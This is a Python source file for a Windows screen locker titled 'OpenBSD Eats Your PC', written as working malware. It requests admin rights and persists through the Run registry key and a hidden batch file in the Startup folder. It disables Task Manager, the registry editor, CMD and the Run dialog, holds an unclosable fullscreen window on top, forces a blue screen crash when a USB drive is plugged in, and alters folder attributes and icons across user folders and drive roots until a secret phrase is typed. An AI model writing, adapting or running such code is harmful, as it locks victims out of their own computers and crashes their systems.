import tkinter as tk
from PIL import Image, ImageTk
import os
import sys
import winreg as reg
import threading
import time
import random
import ctypes
from ctypes import wintypes

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

IMG_PATH = resource_path("рыбка.jpeg")
ICON_PATH = resource_path("nya.ico")
MUSIC_PATH = resource_path("ljnn.mp3")
SECRET_PHRASE = "яникогданепотрогаютраву"
MUTEX_NAME = "Global\\OpenBSD_Eats_Your_PC_MUTEX"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()
    except:
        pass

def check_single_instance():
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 183:
            return False
        return True
    except:
        return True

def bring_to_front():
    try:
        hwnd = ctypes.windll.user32.FindWindowW(None, None)
        
        def callback(hwnd, windows):
            class_name = ctypes.create_unicode_buffer(256)
            window_text = ctypes.create_unicode_buffer(256)
            ctypes.windll.user32.GetClassNameW(hwnd, class_name, 256)
            ctypes.windll.user32.GetWindowTextW(hwnd, window_text, 256)
            
            if "tk" in class_name.value.lower():
                windows.append(hwnd)
            return True
        
        windows = []
        EnumWindows = ctypes.windll.user32.EnumWindows
        EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
        EnumWindows(EnumWindowsProc(callback), ctypes.c_int(id(windows)))
        
        for hwnd in windows:
            ctypes.windll.user32.ShowWindow(hwnd, 9)
            ctypes.windll.user32.SetForegroundWindow(hwnd)
            ctypes.windll.user32.BringWindowToTop(hwnd)
            
    except:
        pass

def trigger_bsod():
    try:
        ntdll = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32
        
        SeShutdownPrivilege = 19
        SE_PRIVILEGE_ENABLED = 0x2
        
        hToken = wintypes.HANDLE()
        kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0020, ctypes.byref(hToken))
        
        if ntdll.RtlAdjustPrivilege(SeShutdownPrivilege, True, False, ctypes.byref(ctypes.c_bool())) == 0:
            response = wintypes.DWORD()
            ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(response))
    except:
        pass

def set_task_mgr(disabled=True):
    try:
        val = 1 if disabled else 0
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, val)
        reg.CloseKey(key)
    except:
        pass

def add_to_startup():
    try:
        pth = os.path.realpath(sys.executable)
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "openbsdeatyoupc", 0, reg.REG_SZ, pth)
        reg.CloseKey(open_key)
    except:
        pass

def remove_from_startup():
    try:
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.DeleteValue(open_key, "openbsdeatyoupc")
        reg.CloseKey(open_key)
    except:
        pass

def toggle_restrictions(disable=True):
    val = 1 if disable else 0
    restrictions = [
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableCMD"),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun"),
    ]
    for path, name in restrictions:
        try:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
            reg.SetValueEx(key, name, 0, reg.REG_DWORD, val)
            reg.CloseKey(key)
        except:
            pass

class UltimateRevenge:
    def __init__(self):
        self.root = tk.Tk()
        self.typed = ""
        
        add_to_startup()
        
        try:
            ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080)
        except: 
            pass

        self.setup_window()
        self.load_image()
        
        set_task_mgr(True)
        toggle_restrictions(True)
        
        self.start_threads()
        self.change_folder_icons()
        self.install_safe_mode_beacon()
        
        self.root.bind("<Key>", self.check_key)
        self.root.bind("<GrabFocus>", lambda e: self.root.focus_force())
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.mainloop()

    def setup_window(self):
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.config(cursor="none")

    def load_image(self):
        if os.path.exists(IMG_PATH):
            img = Image.open(IMG_PATH)
            sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
            img = img.resize((sw, sh))
            self.photo = ImageTk.PhotoImage(img)
            label = tk.Label(self.root, image=self.photo, bg="black")
            label.pack(fill="both", expand=True)
        else:
            self.root.config(bg="black")

    def start_threads(self):
        threading.Thread(target=self._focus_loop, daemon=True).start()
        threading.Thread(target=self._annoying_sounds, daemon=True).start()
        threading.Thread(target=self._check_usb_and_bsod, daemon=True).start()

    def _focus_loop(self):
        while True:
            try:
                self.root.focus_force()
                self.root.attributes("-topmost", True)
                time.sleep(0.1)
            except:
                time.sleep(0.5)

    def _annoying_sounds(self):
        while True:
            time.sleep(random.randint(20, 60))
            try:
                ctypes.windll.user32.MessageBeep(0x00000010)
            except:
                pass

    def _shake_animation(self):
        orig_x = self.root.winfo_x()
        orig_y = self.root.winfo_y()
        
        for _ in range(6):
            for dx, dy in [(10, 0), (-10, 0), (0, 10), (0, -10), (5, 5), (-5, -5)]:
                self.root.geometry(f"+{orig_x + dx}+{orig_y + dy}")
                time.sleep(0.008)
        
        self.root.geometry(f"+{orig_x}+{orig_y}")

    def _shake(self):
        threading.Thread(target=self._shake_animation, daemon=True).start()

    def _check_usb_and_bsod(self):
        existing_drives = set()
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            if os.path.exists(f"{letter}:\\"):
                existing_drives.add(letter)
        
        while True:
            time.sleep(2)
            current_drives = set()
            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                if os.path.exists(f"{letter}:\\"):
                    current_drives.add(letter)
            
            new_drives = current_drives - existing_drives
            if new_drives:
                try:
                    for _ in range(3):
                        self._shake()
                        time.sleep(0.3)
                    
                    trigger_bsod()
                    break
                except:
                    pass
            
            existing_drives = current_drives

    def install_safe_mode_beacon(self):
        threading.Thread(target=self._install_beacon_worker, daemon=True).start()

    def _install_beacon_worker(self):
        if not os.path.exists(MUSIC_PATH):
            return
        
        try:
            beacon_script = os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), 
                "Microsoft\\Windows\\Start Menu\\Programs\\StartUp", "puffy_beacon.bat")
            
            with open(beacon_script, "w", encoding="utf-8") as f:
                f.write(f'''@echo off
timeout /t 3 /nobreak >nul
start /min pythonw -c "
import ctypes
import time
import sys
import os

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath('.')
    return os.path.join(base_path, relative_path)

try:
    import winsound
    MUSIC = resource_path('{os.path.basename(MUSIC_PATH)}')
    if os.path.exists(MUSIC):
        import threading
        def play():
            while True:
                winsound.PlaySound(MUSIC, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
                time.sleep(60)
        t = threading.Thread(target=play, daemon=True)
        t.start()
        
        ctypes.windll.user32.MessageBoxW(0, 
            ' ТЫ ПОБЕДИЛ \\n\\nТы нашел обход\\nмузыка играет для тебя\\n\\nТЫ ПОБЕДИЛ!', 
            'OPENBSD EATS YOUR PC', 0x40 | 0x0)
        
        while True:
            time.sleep(1)
except:
    pass
" >nul 2>&1
exit''')
            
            ctypes.windll.kernel32.SetFileAttributesW(beacon_script, 2)
        except:
            pass

    def cleanup_safe_mode_beacon(self):
        try:
            beacon_script = os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), 
                "Microsoft\\Windows\\Start Menu\\Programs\\StartUp", "puffy_beacon.bat")
            if os.path.exists(beacon_script):
                os.remove(beacon_script)
        except:
            pass

    def change_folder_icons(self):
        threading.Thread(target=self._change_icons_worker, daemon=True).start()

    def _change_icons_worker(self):
        if not os.path.exists(ICON_PATH):
            return
        
        special_folders = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            "C:\\",
        ]
        
        if os.path.exists("D:\\"):
            special_folders.append("D:\\")
        if os.path.exists("E:\\"):
            special_folders.append("E:\\")
        
        for folder in special_folders:
            if not os.path.exists(folder):
                continue
            
            try:
                desktop_ini = os.path.join(folder, "desktop.ini")
                
                with open(desktop_ini, "w", encoding="utf-8") as f:
                    f.write(f"""[.ShellClassInfo]
IconResource={ICON_PATH},0
IconFile={ICON_PATH}
IconIndex=0
InfoTip=nya~ :3
""")
                
                ctypes.windll.kernel32.SetFileAttributesW(desktop_ini, 2)
                
                ctypes.windll.kernel32.SetFileAttributesW(folder, 0x12)
                
            except:
                pass
        
        try:
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x1A, 0, 0)
        except:
            pass

    def cleanup_folder_icons(self):
        if not os.path.exists(ICON_PATH):
            return
        
        special_folders = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            "C:\\",
            "D:\\",
            "E:\\",
        ]
        
        for folder in special_folders:
            if not os.path.exists(folder):
                continue
            
            try:
                desktop_ini = os.path.join(folder, "desktop.ini")
                if os.path.exists(desktop_ini):
                    os.remove(desktop_ini)
                ctypes.windll.kernel32.SetFileAttributesW(folder, 0x80)
            except:
                pass
        
        try:
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x1A, 0, 0)
        except:
            pass

    def check_key(self, event):
        char = event.char.lower()
        if char:
            self.typed += char
            if SECRET_PHRASE.startswith(self.typed):
                if self.typed == SECRET_PHRASE:
                    self.unlock_and_exit()
            else:
                self.typed = ""
                self._shake()

    def unlock_and_exit(self):
        set_task_mgr(False)
        toggle_restrictions(False)
        remove_from_startup()
        self.cleanup_folder_icons()
        self.cleanup_safe_mode_beacon()
        
        try:
            ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000020)
        except: 
            pass
        
        self.root.destroy()

if __name__ == "__main__":
    if os.name == 'nt':
        if not is_admin():
            run_as_admin()
        else:
            if not check_single_instance():
                bring_to_front()
                sys.exit()
            else:
                UltimateRevenge()